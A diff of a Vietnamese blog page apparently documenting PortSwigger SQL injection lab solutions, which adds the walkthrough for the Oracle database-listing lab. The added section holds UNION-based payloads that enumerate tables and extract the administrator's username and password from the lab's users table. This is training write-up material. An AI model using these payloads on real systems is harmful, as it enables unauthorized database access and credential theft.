@@ -37,7 +37,7 @@ SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1 Để g
                             "url": "https:\/\/g03m0n.github.io\/images\/Apple-Devices-Preview.png",
                             "width":  3200 ,
                             "height":  2048 
-                        }],"genre": "posts","keywords": "portswigger, lab, ctf","wordcount":  1184 ,
+                        }],"genre": "posts","keywords": "portswigger, lab, ctf","wordcount":  1257 ,
         "url": "https:\/\/g03m0n.github.io\/posts\/portswigger-sqli\/portswigger-sqli\/","datePublished": "2024-01-20T08:29:01+08:00","dateModified": "2024-01-20T08:29:01+08:00","publisher": {
             "@type": "Organization",
             "name": "xxxx","logo": "https:\/\/g03m0n.github.io\/images\/avatar.png"},"author": {
@@ -127,7 +127,7 @@ SELECT * FROM products WHERE category = &#39;Gifts&#39; AND released = 1 Để g
         </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">PortSwigger - SQL Injection</h1><div class="post-meta">
             <div class="post-meta-line"><span class="post-author"><a href="https://github.com/g03m0n" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>g03m0n</a>
 </span>&nbsp;<span class="post-category">included in <a href="/categories/portswigger/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>PortSwigger</a></span></div>
-            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-20">2024-01-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1184 words&nbsp;
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2024-01-20">2024-01-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;1257 words&nbsp;
                 <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;6 minutes&nbsp;</div>
         </div><div class="details toc" id="toc-static"  data-kept="">
                 <div class="details-summary toc-title">
@@ -403,7 +403,7 @@ Database lần này cũng gồm 2 cột sau khi thử: <code>Accessories' UNION 
         alt="https://github.com/g03m0n/pics/assets/130943529/be23cc16-ac79-472d-a614-6c221cb41210"
         title="image" /></p>
 <p>Như vậy ta đã biết trong database có 2 cột.
-Thử một số cách kiểm tra version của database ta có thể biết được server dụng PostgreSQL.</p>
+Thử một số cách kiểm tra <code>version</code> của database ta có thể biết được server dụng <code>PostgreSQL</code>.</p>
 <p><img
         class="lazyload"
         src="/svg/loading.min.svg"
@@ -460,11 +460,60 @@ Kiểm tra lần lượt các cột trong 2 bảng này thì phát hiện ra tro
         alt="https://github.com/g03m0n/pics/assets/130943529/0a4ac736-2d3b-4b75-bcd0-b13c851b2f8f"
         title="image" /></p>
 <h2 id="6-sql-injection-attack-listing-the-database-contents-on-oracle">6. SQL injection attack, listing the database contents on Oracle</h2>
-<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" rel="noopener noreffer">đây</a>
 </p>
 <p>Level: PRACTITIONER</p>
 <h3 id="description-5">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Sử dụng Oracle Database.</p>
 <h3 id="step-5">Step</h3>
+<p>Giống với <a href="#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" rel="">lab 5</a>
+ ở trên nên mình sẽ làm tương tự.</p>
+<p>Payload: <code>' UNION SELECT NULL, table_name from all_tables --'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d, https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d 1.5x, https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/dd41f87a-e4dd-4e9d-8269-404d942bf73d"
+        title="image" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a, https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a 1.5x, https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/f9443f31-0854-4a2c-b687-2c07e3cad08a"
+        title="image" /></p>
+<p>Tìm được bảng có tên <code>USERS_JBIWMO</code>.
+Tiếp tục tìm kiếm các cột có trong bảng <code>USERS_JBIWMO</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811, https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811 1.5x, https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/86ee64d8-95d9-434a-bc3d-6363f5750811"
+        title="image" /></p>
+<p>Ta tìm được tài khoản/mật khẩu của <code>administrator</code> với payload:</p>
+<p>Payload: <code>' UNION SELECT USERNAME_EYKUIK, PASSWORD_ISAXTU FROM USERS_JBIWMO --'</code>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf, https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf 1.5x, https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/a6c502fb-c261-4817-8aa9-94ea4dfa2daf"
+        title="image" /></p>
+<p>Solved</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344"
+        data-srcset="https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344, https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344 1.5x, https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344 2x"
+        data-sizes="auto"
+        alt="https://github.com/g03m0n/pics/assets/130943529/9f778076-2972-4054-8f91-353430131344"
+        title="image" /></p>
 <h2 id="7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
 <p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
 </p>
